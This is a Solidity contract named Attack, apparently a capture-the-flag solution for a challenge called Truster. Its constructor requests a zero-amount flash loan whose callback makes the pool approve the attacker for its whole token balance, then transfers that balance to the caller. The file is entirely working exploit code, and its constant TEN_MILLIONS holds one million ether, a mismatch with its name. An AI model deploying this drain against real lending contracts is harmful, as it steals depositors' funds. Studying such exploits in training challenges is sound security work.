// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract Attack {
    uint256 constant TEN_MILLIONS = 1000000 ether;

    constructor(ITrusterLenderPool _pool, IERC20 _token) {
        uint amount = _token.balanceOf(address(_pool));

        bytes memory approveFunctionSignature = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );

        _pool.flashLoan(
            0,
            address(this),
            address(_token),
            approveFunctionSignature
        );

        _token.transferFrom(address(_pool), msg.sender, amount);
    }
}
